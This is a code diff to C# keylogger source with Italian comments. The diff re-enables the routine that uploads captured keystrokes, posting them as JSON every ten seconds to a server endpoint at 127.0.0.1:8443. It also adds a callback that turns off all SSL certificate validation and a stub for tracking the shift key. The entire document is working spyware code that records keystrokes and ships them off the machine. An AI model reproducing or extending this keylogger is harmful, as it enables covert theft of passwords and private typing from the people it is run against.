@@ -99,7 +99,7 @@ namespace keylogger
                 InsertKey(vkCode);
                 if ((DateTime.Now - lastSaveTime).TotalSeconds >= 10)
 				{
-					// saveLog();
+					saveLog();
 					Console.WriteLine("son qua");				   
 					lastSaveTime = DateTime.Now;
 					actualString = "";
@@ -111,29 +111,33 @@ namespace keylogger
 
 		private static void saveLog()
 		{
-			var jsonData = new
-			{
-				title = "latest read",
-				text = actualString
-			};
+            var jsonData = new
+            {
+                title = "Latest Read",
+                text = actualString // Si suppone che qui si inserisca una stringa reale da inviare
+            };
 
-			string url = "http://127.0.0.1:5000/file";
+            string url = "https://127.0.0.1:8443/sendUpdates";
 
-			using (WebClient client = new WebClient())
-			{
-				client.Headers[HttpRequestHeader.ContentType] = "application/json";
+            // Ignora la verifica del certificato SSL
+            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
 
-				// Converti l'oggetto JSON in una stringa
-				string jsonString = Newtonsoft.Json.JsonConvert.SerializeObject(jsonData);
+            using (WebClient client = new WebClient())
+            {
+                client.Headers[HttpRequestHeader.ContentType] = "application/json";
 
-				// Invia la richiesta POST
-				string response = client.UploadString(url, "POST", jsonString);
-				
-			}
-		}
+                // Converti l'oggetto JSON in una stringa
+                string jsonString = Newtonsoft.Json.JsonConvert.SerializeObject(jsonData);
+
+                // Invia la richiesta POST
+                string response = client.UploadString(url, "POST", jsonString);
+            }
+        }
 
 		private static void InsertKey(int vkCode)
 		{
+
+			//checkShifted();
 			if (dizionario.ContainsKey($"{(Keys)vkCode}"))
 				actualString += dizionario[$"{(Keys)vkCode}"];
 			else
@@ -153,7 +157,15 @@ namespace keylogger
 			Console.WriteLine(actualString);
 		}
 
-		public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
+        private static void checkShifted()
+        {
+			if (actualString.Substring(Math.Max(0, actualString.Length - 7)) == "[shift]")
+			{
+
+			}
+        }
+
+        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
 
 	}
 }
